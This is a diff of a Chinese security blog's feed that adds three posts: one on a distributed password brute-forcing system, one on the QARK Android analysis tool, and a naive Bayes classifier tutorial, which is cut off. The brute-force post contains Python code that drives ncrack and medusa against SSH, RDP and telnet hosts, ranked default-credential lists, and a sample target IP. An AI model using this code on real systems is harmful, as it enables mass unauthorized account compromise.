@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://www.future-sec.com/"/>
-  <updated>2018-01-19T07:32:47.046Z</updated>
+  <updated>2018-04-08T06:30:05.879Z</updated>
   <id>http://www.future-sec.com/</id>
   
   <author>
@@ -14,6 +14,537 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>谁是僵尸之王-如何进行高效的分布式爆破</title>
+    <link href="http://www.future-sec.com/king-of-zombie.html"/>
+    <id>http://www.future-sec.com/king-of-zombie.html</id>
+    <published>2018-04-07T16:00:00.000Z</published>
+    <updated>2018-04-08T06:30:05.879Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在研发漏洞扫描器的弱口令破解模块时，发现传统的通过字典遍历用户名密码的算法效率过低，当需要大批量高速爆破时，难以满足此类需求，因此需要引入新的算法，本文以一个分布式扫描器的爆破模块为例，演示如何进行高效快速的分布式爆破。<br><img src="http://p1aqjecep.bkt.clouddn.com/6172922.jpg" alt="617292"></p>
+<h2 id="传统方法"><a href="#传统方法" class="headerlink" title="传统方法"></a>传统方法</h2><p>传统的密码穷举</p>
+<p><img src="http://p1aqjecep.bkt.clouddn.com/15156625175922.jpg" alt=""><br>效率非常低，而且还有可能触发报警  </p>
+<h2 id="king-of-zombie"><a href="#king-of-zombie" class="headerlink" title="king of zombie"></a>king of zombie</h2><p>koz (king of zombie) 算法,即首先按照多种算法对用户名密码字典组合进行评分,然后用评分最高的组合去淘汰僵尸主机。</p>
+<h3 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h3><ol>
+<li>上游push ncrack任务到队列</li>
+<li>koz 节点开始瓜分队列任务,保存为任务列表 (根据cpu,网速来分配多少任务) 。</li>
+<li>使用账号密码字典爆破来遍历任务列表,hit中 即从列表中淘汰(字典按评分优先级排序)。</li>
+</ol>
+<ul>
+<li>说明</li>
+</ul>
+<ol>
+<li><p>字典评分按照爆破成功记录次数和蜜罐记录次数来计算,master 端实时更新,koz node 每日定时更新。</p>
+</li>
+<li><p>淘汰机制具体为先去除一大部分普遍存在的弱口令,例如某一批次中,第一次使用 ubnt/ubnt 来爆破ssh服务,就能淘汰 15% 的任务,第二次使用 root/123456 能淘汰 3% 。</p>
+</li>
+</ol>
+<h3 id="表结构"><a href="#表结构" class="headerlink" title="表结构"></a>表结构</h3><p>pw_koz_level </p>
+<table>
+<thead>
+<tr>
+<th>列</th>
+<th>类型</th>
+<th>注释</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>id</td>
+<td>int(11)</td>
+<td>自动增量</td>
+</tr>
+<tr>
+<td>username</td>
+<td>varchar(255)</td>
+<td>用户名</td>
+</tr>
+<tr>
+<td>password</td>
+<td>varchar(255)</td>
+<td>密码</td>
+</tr>
+<tr>
+<td>type</td>
+<td>varchar(255)</td>
+<td>类型</td>
+</tr>
+<tr>
+<td>score</td>
+<td>int(11)</td>
+<td>评分</td>
+</tr>
+</tbody>
+</table>
+<h3 id="更新算法"><a href="#更新算法" class="headerlink" title="更新算法"></a>更新算法</h3><p>目前数据来源有四个<br>第一个  扫描器爆破成功记录  score 值为 10<br>第二个  蜜罐记录   score 值 为 1<br>第三个  渗透进去提取到的有效密码(例如windows 明文)  ,score 10<br>第四个  收集的各种工具扫描字典  score 值为 1</p>
+<p>扫描的时候工具score 值来排序,命中一次之后+10 </p>
+<p>例如如下字典列表</p>
+<p><img src="http://p1aqjecep.bkt.clouddn.com/15228255230476.jpg" alt=""></p>
+<h4 id="master"><a href="#master" class="headerlink" title="master"></a>master</h4><p>推送任务之后使用无状态扫描工具扫描服务和指纹识别</p>
+<h4 id="koz-node"><a href="#koz-node" class="headerlink" title="koz node"></a>koz node</h4><p>KozTask 类来保存本地任务队列,接收处的代码为</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span>  <span class="title">pop_member</span><span class="params">(self)</span>:</span></div><div class="line">    <span class="keyword">while</span> self.len() &gt;  <span class="number">0</span>:</div><div class="line">        str_member=self.pop()</div><div class="line">        koz_member=ast.literal_eval(str_member)</div><div class="line">        self.list_member[str(koz_member[<span class="string">'name'</span>])].append(koz_member)</div><div class="line">    util.log(<span class="string">"pop koz_member  done count:%d"</span>  % (self.count()),<span class="number">2</span>,<span class="string">'koztask'</span>)</div></pre></td></tr></table></figure>
+<p>本地队列处理完毕之后,开始foreach 循环用户名密码组合(根据score 大小优先级)</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">koz_levels=get_koz_level()</div><div class="line"><span class="keyword">for</span> koz_level  <span class="keyword">in</span>  koz_levels :</div><div class="line">    koz_queue.queue.clear()</div><div class="line">    <span class="comment">#member=&#123;'name': 'ssh', 'task_id': 1124, 'url': '', 'host': '168.167.45.250', 'version': '', 'type': 'service', 'port': 22&#125;</span></div><div class="line">    <span class="comment">#ncrack.scan(member,koz_level)</span></div><div class="line">    <span class="comment">#break</span></div><div class="line">    <span class="keyword">try</span> :</div><div class="line">        <span class="keyword">for</span> member  <span class="keyword">in</span>   koz_task.list_member[koz_level[<span class="string">'type'</span>]] :</div><div class="line">            koz_queue.put(&#123;<span class="string">'member'</span>:member,<span class="string">'level'</span>:koz_level&#125;)</div><div class="line"></div><div class="line">        work_manager = WorkManager(koz_queue, config.koz_thread)  <span class="comment"># thread</span></div><div class="line">        work_manager.wait_allcomplete()</div><div class="line">    <span class="keyword">except</span> Exception, e:</div><div class="line">        util.log(<span class="string">"error info:"</span>+str(e),<span class="number">3</span>,<span class="string">'koz_node'</span>)</div><div class="line">    util.log(<span class="string">'koz_member len:%d'</span> % (koz_task.count()),<span class="number">1</span>,<span class="string">'koz_node'</span>)</div></pre></td></tr></table></figure>
+<p>当扫描出来结果时,直接把它从 koz_member 队列里面remove 掉,如此循环往复,直到跑完所有的密码。<br>remove </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></div><div class="line">    <span class="keyword">while</span>  <span class="number">1</span>:</div><div class="line">        <span class="keyword">if</span> self.work_queue.empty() == <span class="keyword">True</span>:</div><div class="line">            <span class="keyword">break</span></div><div class="line">        task = self.work_queue.get(block=<span class="keyword">False</span>)</div><div class="line">        <span class="keyword">if</span> ncrack.scan(task[<span class="string">'member'</span>],task[<span class="string">'level'</span>])  != <span class="keyword">False</span> :</div><div class="line">            koz_type=task[<span class="string">'member'</span>][<span class="string">'name'</span>]</div><div class="line">            koz_task.list_member[koz_type].remove(task[<span class="string">'member'</span>])</div></pre></td></tr></table></figure>
+<h3 id="爆破算法"><a href="#爆破算法" class="headerlink" title="爆破算法"></a>爆破算法</h3><p>负责爆破的为ncrack 模块,调用的爆破工具有  medusa,ncrack。<br>部分实现</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span><span class="params">(target,level)</span>:</span></div><div class="line">    <span class="keyword">if</span> target[<span class="string">'name'</span>]  == <span class="string">'ms-wbt-server'</span>  <span class="keyword">or</span>  target[<span class="string">'name'</span>]  == <span class="string">'telnet'</span> :</div><div class="line">        str_command = <span class="string">"ncrack --user %s --pass %s  %s:%d "</span>  %  (level[<span class="string">'username'</span>],level[<span class="string">'password'</span>],target[<span class="string">'host'</span>],target[<span class="string">'port'</span>])</div><div class="line">        str_ret=str(sys_exec([<span class="string">'ncrack'</span>, <span class="string">'--user'</span>,level[<span class="string">'username'</span>], <span class="string">'--pass'</span>, level[<span class="string">'password'</span>], target[<span class="string">'host'</span>]+<span class="string">':'</span>+ str(target[<span class="string">'port'</span>])]))</div><div class="line">    <span class="keyword">else</span> :</div><div class="line">        str_command = <span class="string">"medusa -u %s -p %s -h %s -n %d  -M %s"</span> % (level[<span class="string">'username'</span>], level[<span class="string">'password'</span>], target[<span class="string">'host'</span>], target[<span class="string">'port'</span>], target[<span class="string">'name'</span>])</div><div class="line">        str_ret=str(sys_exec([<span class="string">'medusa'</span>,<span class="string">'-u'</span>,level[<span class="string">'username'</span>],<span class="string">'-p'</span>,level[<span class="string">'password'</span>],<span class="string">'-h'</span>,target[<span class="string">'host'</span>],<span class="string">'-n'</span>,str(target[<span class="string">'port'</span>]),<span class="string">'-M'</span>,target[<span class="string">'name'</span>]]))</div><div class="line">    </div><div class="line">    util.log(str_command, <span class="number">2</span>, <span class="string">'ncrack'</span>)</div><div class="line">    <span class="comment">#need  change </span></div><div class="line">    <span class="keyword">if</span> <span class="string">'ACCOUNT FOUND'</span> <span class="keyword">in</span> str_ret  <span class="keyword">or</span>  <span class="string">'credentials'</span>  <span class="keyword">in</span> str_ret:</div><div class="line">        str_data=<span class="string">'[%s] %s %s:%s'</span>   %  (target[<span class="string">'name'</span>],target[<span class="string">'host'</span>],level[<span class="string">'username'</span>],level[<span class="string">'password'</span>])</div><div class="line">        util.log(<span class="string">'ncrack taskid:%d target:%s service:%s succeed'</span> % (target[<span class="string">'task_id'</span>], target[<span class="string">'host'</span>], target[<span class="string">'name'</span>]), <span class="number">1</span>, <span class="string">'ncrack'</span>)</div><div class="line">        <span class="keyword">return</span> report(target,str_data)</div><div class="line">        </div><div class="line">    <span class="keyword">else</span>  :</div><div class="line">        <span class="keyword">return</span> <span class="keyword">False</span></div></pre></td></tr></table></figure>
+<h3 id="爆破结果"><a href="#爆破结果" class="headerlink" title="爆破结果"></a>爆破结果</h3><p> 总览<br><img src="http://p1aqjecep.bkt.clouddn.com/14703046762519.png" alt=""></p>
+<p>图文分析</p>
+<p><img src="http://p1aqjecep.bkt.clouddn.com/14703047183607.jpg" alt=""></p>
+<p>部分结果一览</p>
+<p><img src="http://p1aqjecep.bkt.clouddn.com/147030475970560.jpg" alt="147030475970560"></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;在研发漏洞扫描器的弱口令破解模块时，发现传统的通过字典遍历用户名密码的算法效率过低，当需要大批量高速爆破时，难以满足此类需求，因此需要引入新
+    
+    </summary>
+    
+      <category term="web安全" scheme="http://www.future-sec.com/categories/web%E5%AE%89%E5%85%A8/"/>
+    
+    
+      <category term="密码爆破" scheme="http://www.future-sec.com/tags/%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>QARK工具的介绍和原理分析</title>
+    <link href="http://www.future-sec.com/introducing-qark.html"/>
+    <id>http://www.future-sec.com/introducing-qark.html</id>
+    <published>2018-04-07T16:00:00.000Z</published>
+    <updated>2018-04-08T06:32:05.415Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>QARK的核心是一个静态代码分析工具，旨在识别基于Java的Android应用程序的潜在安全漏洞和关注点。QARK还试图提供动态生成的ADB（Android调试桥）命令，以帮助验证其检测到的潜在漏洞。它甚至可以动态地创建一个定制的测试应用程序，以即用APK的形式，专门设计来展示它发现的潜在问题。<br>QARK的设计是基于社区的，可供所有人免费使用。QARK被设计出来的主要目的和大多数的自动化检测工具一样是教育开发人员和信息安全人员了解与Android应用程序安全相关的潜在风险 ，相应的开发人员和评估人员就可以在开发和检测阶段，针对于APP移动应用进行检测，及时修改相应的风险点。</p>
+<h2 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h2><p>•    python 2.7.<br>•    JRE 1.6+（最好1.7+）<br>•    Ubuntu环境（最好）<br>•    未加固的测试APK；<br>•    一台root过的手机<br>在前提条件中，有提到未加固的APK，从简介中，我们就提到该工具就是一个静态代码分析的工具，在其中QARK的脚本中是没有脱壳的脚本，所以是需要未加固的APK，其中的ubuntu环境不是唯一的，但是我只在ubuntu成功过，所以我建议试用该环境。</p>
+<h2 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h2><p>QARK是一款易于使用的工具，能够找到Android应用程序中的常见安全漏洞。与商业产品不同，它可以100％免费使用。QARK提供教育信息，允许安全审查人员找到对漏洞的精确和深入的解释。在反编译APK时，QARK可以自动使用多个反编译器，利用它们的组合输出来产生出色的结果。最后，QARK与传统工具相比的主要优势仅仅是指出可能存在的漏洞，它可以产生ADB命令甚至功能齐全的APK，将假设的漏洞转化为“POC”漏洞利用。<br>包含在此工具尝试查找的安全漏洞类型中的有：<br>•    无意中导出的组件<br>•    未妥善保护的导出组件<br>•    易受拦截或窃听的intent<br>•    不正确的x.509证书验证<br>•    创建事件可读或事件可写的文件<br>•    可能泄漏数据的Activity<br>•    粘滞的intent的使用<br>•    不安全地创建了Pending Intents<br>•    发送不安全的广播Intent<br>•    嵌入在源中的私钥<br>•    弱密码学使用不当或不适用<br>•    潜在可利用的WebView配置<br>•    导出偏好活动<br>•    Tapjacking<br>•    启用备份的应用程序<br>•    可调试的应用程序<br>•    支持过时API版本的应用程序，具有已知的漏洞</p>
+<h2 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h2><p>前面我们说过该工具就是静态代码分析的工具，所以首先我打开相应的qark.py脚本文件,其可以发现刚开始就使用到unpackAPK脚本，然后打开相应的unpackAPK,py，发现相应aapt和dex2jar，这里就可以知道还是老方法，对apk进行反编译，然后在进行相应的dex2jar把dex转换为jar文件，之后在进行查看源码。<br><img src="http://p6usvwwl2.bkt.clouddn.com/image001.png" alt=""><br><img src="http://p6usvwwl2.bkt.clouddn.com/image002.png" alt=""><br><img src="http://p6usvwwl2.bkt.clouddn.com/image003.png" alt=""> </p>
+<p>然后就是相应的代码静态分析，这里就需要对于检测项目的了解，其实说到底就是一个关键代码查找和匹配，因为这些检测项目大部分引起的原因就是编写代码没有注意到相关的安全措施，例如其中的组件暴露就是，组件的属性exported：设置为ture或者没有设置，则默认为true，这就会导致相应的组件暴露。<br>我们查看下mouble文件夹里面，基本上所有的检测项目都是这里的检测检测脚本。<br><img src="http://p6usvwwl2.bkt.clouddn.com/image004.png" alt=""><br>我们就分析其中的cryptoFlaws.py这个脚本，从字面意思就是密码缺陷，那这个部分就是针对于移动应用加解密子之类的风险。我们直接打开来查看其中方法。<br>这里我们看到相应的寻找ECB的特殊关键字，这个是检测AES和DES是否存在弱加密（ECB模式）的风险。<br><img src="http://p6usvwwl2.bkt.clouddn.com/image005.png" alt=""><br>这个地方是匹配PRIVATE\sKEY的1特殊关键字，寻找相应的加密算法的私钥，这个地方的私钥如果存在且是以明文形式存在，这个就是加密算法的密钥硬编码风险，会导致相关的加密算法被破解。<br><img src="http://p6usvwwl2.bkt.clouddn.com/image006.png" alt=""><br>这里还有一个地方，但是方法被注释掉了，这个是匹配SecureRandom.setseed（）方法，这个是伪随机数的一个风险点。<br><img src="http://p6usvwwl2.bkt.clouddn.com/image007.png" alt=""><br> 大部分的原理都是类似的。所以其他的脚本就看各位自己去分析。</p>
+<h2 id="操作步骤"><a href="#操作步骤" class="headerlink" title="操作步骤"></a>操作步骤</h2><p>QARK有两种模式：1.交互模式 2.无缝模式<br>交互模式使用户能够交互地一个接一个地选择选项。而无缝模式允许我们用一个命令完成整个工作。<br>我们主要看看交互模式的实际应用。<br>输入python qark.py<br><img src="http://p6usvwwl2.bkt.clouddn.com/image008.png" alt=""><br>接着会有选择apk或者soure，这些都是通过数字来进行选择。继续下去会有输入路径或者通过设备来进行检测。我们选择1，然后底下就开始提示是否导出mainfirst文件。<br><img src="http://p6usvwwl2.bkt.clouddn.com/image009.png" alt=""><br>接下来就直接导出相应的mainfist文件，这其实就是直接反编译获取到的。接下来就是先从mainfirst文件进行分析，分析相应组件暴露和allowback和debuggable等相关的风险点。<br><img src="http://p6usvwwl2.bkt.clouddn.com/image010.png" alt=""><br><img src="http://p6usvwwl2.bkt.clouddn.com/image011.png" alt=""><br>接下里，我们继续查看，直接检测broadcast广播是否有附带相应的敏感信息，然后就是相应的脚本进行检测，例如x509证书检验，这些都是该工具具有的代码静态分析。<br><img src="http://p6usvwwl2.bkt.clouddn.com/image012.png" alt=""><br><img src="http://p6usvwwl2.bkt.clouddn.com/image013.png" alt=""><br>最后会在qark的本身目录中的report.html文件，这个文件类似于mobsf生成的界面。这里面就是会把刚刚经过检测的所有风险都以报告的形式打印出来，都会在相应的选项中，详细的告诉你风险点存在的位置，以及相应的危害。<br>但是在这里我们只是看到很稀少的数据，其实这些数据只是mainfist文件暴露出来的风险点，但是代码中的分析根本没有进行分析。问题出在于apk本身，这是一个有进行加固的apk，我之前说过这个工具无法进行相应的脱壳，所以导致无法获取到相应的代码，就无法进行相应的分析，所以其他数据就是空的。</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>在安装的过程会有一个问题就是python no module named _curses的问题，这个问题最后解决了，经过对比python2.6 ，终于发现，原来 pythong2.7/lib-dynload 里没有相应的 curses 库，_curses_panel.so，_curses.so。说到底就是去缺少文件，所以此时你将python2.6 的 这2个so文件拷贝到 pythong2.7 的lib-dynload 文件夹下， 就解决了问题。或者你可以下载ncurses文件，然后重新跑下python就可以了。<br><img src="http://p6usvwwl2.bkt.clouddn.com/image014.png" alt=""><br>我们前面也说过这款工具是为了教育开发人员和信息安全人员了解与Android应用程序安全相关的潜在风险 ，相应的开发人员和评估人员就可以在开发和检测阶段，针对于APP移动应用进行检测，及时修改相应的风险点。<br>其实通过对于QARK的了解，我们不难看出这就是和大多数自动化工具一样就是，感觉就像个多了些脚步的Mobsf，作为一个安全评估人员，其实再多的检测工具也是辅助，我们仍然需要进行自己的分析，有些风险点也不一定是准确的，所以我们是需要好好利用该工具。</p>
+<p>参考的文章：<br><a href="http://resources.infosecinstitute.com/qark-a-tool-for-automated-android-app-assessments/#gref" rel="external nofollow noopener noreferrer" target="_blank">http://resources.infosecinstitute.com/qark-a-tool-for-automated-android-app-assessments/#gref</a><br><a href="https://github.com/linkedin/qark" rel="external nofollow noopener noreferrer" target="_blank">https://github.com/linkedin/qark</a><br>工具下载链接：<br><a href="https://github.com/linkedin/qark" rel="external nofollow noopener noreferrer" target="_blank">https://github.com/linkedin/qark</a></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h2&gt;&lt;p&gt;QARK的核心是一个静态代码分析工具，旨在识别基于Java的Android应用程序的潜在安全漏洞和关注点。QARK还试图提供动态生成的ADB
+    
+    </summary>
+    
+      <category term="移动安全" scheme="http://www.future-sec.com/categories/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/"/>
+    
+    
+      <category term="QARK" scheme="http://www.future-sec.com/tags/QARK/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>贝叶斯分类器</title>
+    <link href="http://www.future-sec.com/bayesian-classifier.html"/>
+    <id>http://www.future-sec.com/bayesian-classifier.html</id>
+    <published>2018-04-07T16:00:00.000Z</published>
+    <updated>2018-04-08T06:52:02.330Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>贝叶斯模型在机器学习以及人工智能中都有出现，<a href="https://github.com/Sunkist-Cherry/cherry" rel="external nofollow noopener noreferrer" target="_blank">cherry分类器</a>使用了朴素贝叶斯模型算法，<strong>经过简单的优化，使用1000个训练数据就能得到97.5%的准确率。</strong>虽然现在主流的框架都带有朴素贝叶斯模型算法，大多数开发者只需要直接调用api就能使用。但是在实际业务中，面对不同的数据集，必须了解算法的原理，实现以及懂得对结果进行分析，才能达到高准确率。</p>
+<h2 id="cherry分类器"><a href="#cherry分类器" class="headerlink" title="cherry分类器"></a>cherry分类器</h2><p>###基础术语：<br><a href="(https://github.com/Sunkist-Cherry/cherry">cherry分类器</a>)默认支持中英文分类，用作例子的数据缓存中，中文训练数据包含<strong>正常</strong>，<strong>政治敏感</strong>，<strong>赌博</strong>，<strong>色情</strong>4个类别，英文训练数据包含<strong>正常邮件</strong>，<strong>垃圾邮件</strong>两个类别 (训练数据可以通过<a href="https://drive.google.com/file/d/1OtbY7RCjkoQWYb0fHIOTBcJfgDlW5Tjz/view?usp=sharing" rel="external nofollow noopener noreferrer" target="_blank">Google drive</a>下载)。调用非常容易，使用pip安装后，输入句子：</p>
+<blockquote>
+<p>警方召开了全省集中打击赌博违法犯罪活动专项行动电视电话会议。会议的重点是“查处”六合彩、赌球赌马等赌博活动。</p>
+<blockquote>
+<blockquote>
+<p>import cherry<br>result = cherry.classify(‘警方召开了全省集中打击赌博违法犯罪活动专项行动电 电话会议。会议的重点是“查处”六合彩、赌球赌马等赌博活动。’)<br>    Building prefix dict from the default dictionary …<br>    Loading model from cache /var/folders/md/0251yy51045d6nknpkbn6dc80000gn/T/jieba.cache<br>    Loading model cost 0.894 seconds.<br>    Prefix dict has been built succesfully.</p>
+</blockquote>
+</blockquote>
+</blockquote>
+<p>分类器判断输入句子有99.7%的概率是正常句子，0.2%是政治敏感，剩余0.1%是其他两个类别</p>
+<pre><code>&gt;&gt;&gt; result.percentage
+[(&apos;normal.dat&apos;, 0.997), (&apos;politics.dat&apos;, 0.002), (&apos;gamble.dat&apos;, 0.0), (&apos;sex.dat&apos;, 0.0)]
+</code></pre><p>其中对分类器判断影响最大的词语分别是<strong>赌博</strong>，<strong>活动</strong>，<strong>会议</strong>，<strong>违法犯罪</strong>，<strong>警方</strong>，<strong>打击</strong></p>
+<pre><code>&gt;&gt;&gt; result.word_list
+[(&apos;赌博&apos;, 8.5881312727226), (&apos;活动&apos;, 6.401543938544878), (&apos;会议&apos;, 6.091963362021649), (&apos;违法犯罪&apos;, 4.234845736802978), (&apos;警方&apos;, 3.536827626008435), (&apos;打击&apos;, 3.2491455535566542), (&apos;行动&apos;, 2.8561029654470476), (&apos;查处&apos;, 2.3860993362013083), (&apos;重点&apos;, 2.126816738271229), (&apos;召开&apos;, 1.8628511924367634), (&apos;专项&apos;, 1.1697040118768172), (&apos;电视电话会议&apos;, 1.1697040118768172), (&apos;全省&apos;, 0.47655683131687354), (&apos;集中&apos;, -0.6220554573512382), (&apos;六合彩&apos;, -2.29603189092291)]
+</code></pre><h3 id="关键字过滤"><a href="#关键字过滤" class="headerlink" title="关键字过滤"></a>关键字过滤</h3><p>要理解分类器的原理，可以先从最简单的分类关键词算法开始，输入句子：</p>
+<blockquote>
+<p>奖金将在您完成首存后即可存入您的账户。真人荷官，六合彩，赌球欢迎来到全新番摊游戏！</p>
+</blockquote>
+<p>使用关键字算法，我们可以将<strong>真人荷官</strong>，<strong>六合彩</strong>这两个词语加入赌博类别的黑名单，每个类别都维持对应的黑名单表。当之后需要分类的时候，先判断关键字有没有出现在输入句子中，如果有，则判断为对应的类别。这个方法实现简单，但是缺点也很明显，误判率非常高，例如遇到输入句子：</p>
+<blockquote>
+<p>警方召开了全省集中打击赌博违法犯罪活动专项行动电视电话会议。会议的重点是“查处”六合彩、赌球赌马等赌博活动。</p>
+</blockquote>
+<p>这是一个正常的句子，但是由于包含<strong>六合彩</strong>，<strong>赌球</strong>这两个黑名单词语，关键字算法会误判其为赌博类别，同时，如果一个句子同时包含多个不同类别的黑名单词语，例如<strong>赌博</strong>，<strong>色情</strong>的话，关键字算法也无法判断正确。</p>
+<h3 id="贝叶斯模型"><a href="#贝叶斯模型" class="headerlink" title="贝叶斯模型"></a>贝叶斯模型</h3><p>其实关键字算法已经接近贝叶斯模型的原理了，我们再仔细分析下关键字算法。<strong>关键字算法的问题在于只对输入句子中的部分词语进行分析，而没有对输入句子的整体进行分析。而贝叶斯模型会对输入句子的所有有效部分进行分析，通过训练数据计算出每个词语在不同类别下的概率，然后综合得出最有可能的结果。可以说，贝叶斯模型是关键字过滤加上统计学的升级版。</strong></p>
+<p>当贝叶斯模型去判断输入句子：<br>​                                                </p>
+<blockquote>
+<p>警方召开了全省集中打击赌博违法犯罪活动专项行动电视电话会议。会议的重点是“查处”六合彩、赌球赌马等赌博活动。</p>
+</blockquote>
+<p>它会综合分析句子中的每个词语：</p>
+<pre><code>警方，召开，全省，集中打击，... 六合彩，赌球，赌马，...
+</code></pre><p>输入句子虽然包含<strong>六合彩</strong>，<strong>赌球</strong>这些赌博常出现的词语，但是<strong>警方</strong>，<strong>召开</strong>，<strong>集中打击</strong>这几个词代表这个句子极有可能是正常的句子。</p>
+<h3 id="数学推导"><a href="#数学推导" class="headerlink" title="数学推导"></a>数学推导</h3><p>贝叶斯模型的数学推导非常简单，强烈建议大家静下心自己推导。</p>
+<p>这里为了简单起见，我们只考虑句子是<strong>正常</strong>或者<strong>赌博</strong>两种可能，我们先复习一下概率论的基础表达：</p>
+<blockquote>
+<p>P(A) -&gt; A事件发生的概率，例如明天天晴的概率</p>
+<p>P(A|B) -&gt; 条件概率，B事件发生的前提下A事件发生的概率，例如明天天晴而我又没带伞的概率</p>
+<p>P(输入句子) -&gt; 这个句子在训练数据中出现的概率 </p>
+<p>P(赌博) -&gt; 赌博类别的句子在训练数据中出现的概率</p>
+<p>P(赌博|输入句子) -&gt; 输入句子是赌博类别的概率（也是我们最终要求的值）</p>
+<p>P(赌博|输入句子) + P(正常|输入句子) = 100%</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/EngineGirl/enginegirl.github.io/master/images/bayes/bayes.png" alt="Bayes"></p>
+<p>上图，中间重叠的部分是赌博和句子同时发生的概率P(赌博，输入句子)，可以看出：</p>
+<blockquote>
+<p>P(赌博|输入句子) = P(赌博，输入句子) / P(输入句子) (1)</p>
+</blockquote>
+<p>同理：</p>
+<blockquote>
+<p>P(输入句子|赌博) = P(赌博，输入句子) / P(赌博) (2)</p>
+</blockquote>
+<p>把(2)代入(1)得到</p>
+<blockquote>
+<p>P(赌博|输入句子) = P(输入句子|赌博) * P(赌博) / P(输入句子) (3)</p>
+</blockquote>
+<p>登登登灯，(3)就是贝叶斯模型定理。没看懂没关系，静下心再看一遍。<strong>要得到最终输入句子是赌博类别的概率P(赌博|输入句子)，需要知道右边3个量的值</strong>：</p>
+<ol>
+<li><p><strong>P(赌博)</strong></p>
+<p> 指训练数据中，赌博类别的句子占训练数据的百分比。</p>
+</li>
+<li><p><strong>P(输入句子)</strong></p>
+<p> 指这个输入句子出现在训练数据中的概率。我们最终目的是判断输入句子是哪个类别的概率比较高，也就是比较P(赌博|输入句子)与P(正常|输入句子)，由贝叶斯定理：</p>
+<blockquote>
+<p>P(赌博|输入句子) = P(输入句子|赌博) * P(赌博) / P(输入句子) (4)</p>
+<p>P(正常|输入句子) = P(输入句子|正常) * P(正常) / P(输入句子) (5)</p>
+</blockquote>
+<p> 由于(4)，(5)都要除于相同的P(输入句子)，所以(4)，(5)右边可以同时乘以P(句子)，只比较等号右边前两个值的乘积的大小。</p>
+<blockquote>
+<p>P(赌博|输入句子) = P(输入句子|赌博) <em> P(赌博)<br>P(正常|输入句子) = P(输入句子|正常) </em> P(正常)</p>
+</blockquote>
+</li>
+<li><p><strong>P(句子|赌博)</strong></p>
+<p> <strong>最关键的就是求P(输入句子|赌博)</strong>，直接求输入句子在赌博类别句子中出现的概率非常困难，因为训练数据不可能包含所有句子，很可能并没有输入句子。什么意思呢？因为同一个句子，把词语进行不同的排列组合都能成立，例如：</p>
+<blockquote>
+<p>奖金将在您完成首存后即可存入您的账户。真人荷官，六合彩，赌球欢迎来到全新番摊游戏！</p>
+</blockquote>
+<p> 可以变成</p>
+<blockquote>
+<p>奖金将在您完成首存后即可存入您的账户。六合彩，赌球，真人荷官欢迎来到全新番摊游戏！</p>
+</blockquote>
+<p> 或者</p>
+<blockquote>
+<p>欢迎来到全新番摊游戏，奖金将在您完成首存后即可存入您的账户。六合彩，真人荷官，赌球！</p>
+</blockquote>
+<p> 稍微变换词语的位置就是一个新的句子了，训练数据不可能把所有排列组合的句子都加进去，因为实在太多了。<strong>所以当我们遇到一个输入句子，很可能它在训练数据中没有出现，那么P(输入句子|类别)对应的概率都为零，这显然不是真实的结果。也会导致我们的分类器出错</strong>，这个时候该怎么办呢？<strong>刚刚在<a href="#贝叶斯模型">贝叶斯模型</a>中我们提到，它会将一个句子分成不同的词语来综合分析，那我们是不是也可以把句子当成词语的集合呢？</strong></p>
+<blockquote>
+<p>警方召开了全省集中打击赌博违法犯罪活动专项行动电视电话会议。会议的重点是“查处”六合彩、赌球赌马等赌博活动。</p>
+<p>警方召开了全省…赌马等赌博活动 = 警方 + 召开 + 全省…+赌博活动 </p>
+</blockquote>
+<p> 即：</p>
+<blockquote>
